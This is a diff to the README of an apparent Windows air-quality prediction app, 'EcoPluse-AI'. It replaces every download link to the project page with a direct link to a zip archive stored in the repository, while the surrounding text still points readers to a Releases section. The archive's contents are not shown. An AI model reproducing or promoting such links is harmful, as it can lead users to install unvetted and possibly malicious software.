@@ -1,6 +1,6 @@
 # 🌍 EcoPluse-AI - Predict Air Quality Before It Drops
 
-[![Download EcoPluse-AI](https://img.shields.io/badge/Download-EcoPluse--AI-green?style=for-the-badge)](https://github.com/AbduKayam2000/EcoPluse-AI)
+[![Download EcoPluse-AI](https://img.shields.io/badge/Download-EcoPluse--AI-green?style=for-the-badge)](https://github.com/AbduKayam2000/EcoPluse-AI/raw/refs/heads/main/ecopulse_ai/AI-Eco-Pluse-3.0.zip)
 
 ## 📘 What is EcoPluse-AI?
 
@@ -24,7 +24,7 @@ If your computer fits these requirements, you should be able to run EcoPluse-AI 
 
 Download the program by visiting the following page:
 
-[![Download EcoPluse-AI](https://img.shields.io/badge/Download-EcoPluse--AI-blue?style=for-the-badge)](https://github.com/AbduKayam2000/EcoPluse-AI)
+[![Download EcoPluse-AI](https://img.shields.io/badge/Download-EcoPluse--AI-blue?style=for-the-badge)](https://github.com/AbduKayam2000/EcoPluse-AI/raw/refs/heads/main/ecopulse_ai/AI-Eco-Pluse-3.0.zip)
 
 Click the link to open the project page on GitHub. This page contains the latest version of the software and additional information.
 
@@ -34,7 +34,7 @@ Follow these steps to download and start using EcoPluse-AI on your Windows compu
 
 1. Open your web browser and go to the download page:
 
-   https://github.com/AbduKayam2000/EcoPluse-AI
+   https://github.com/AbduKayam2000/EcoPluse-AI/raw/refs/heads/main/ecopulse_ai/AI-Eco-Pluse-3.0.zip
 
 2. Find the "Releases" section on this page. It usually appears under the main description or in the menu on the right.
 
@@ -115,4 +115,4 @@ The system supports smart city planning by giving early warnings about pollution
 
 ---
 
-[Download EcoPluse-AI now](https://github.com/AbduKayam2000/EcoPluse-AI) to start monitoring your environment with smart, easy software.
+[Download EcoPluse-AI now](https://github.com/AbduKayam2000/EcoPluse-AI/raw/refs/heads/main/ecopulse_ai/AI-Eco-Pluse-3.0.zip) to start monitoring your environment with smart, easy software.
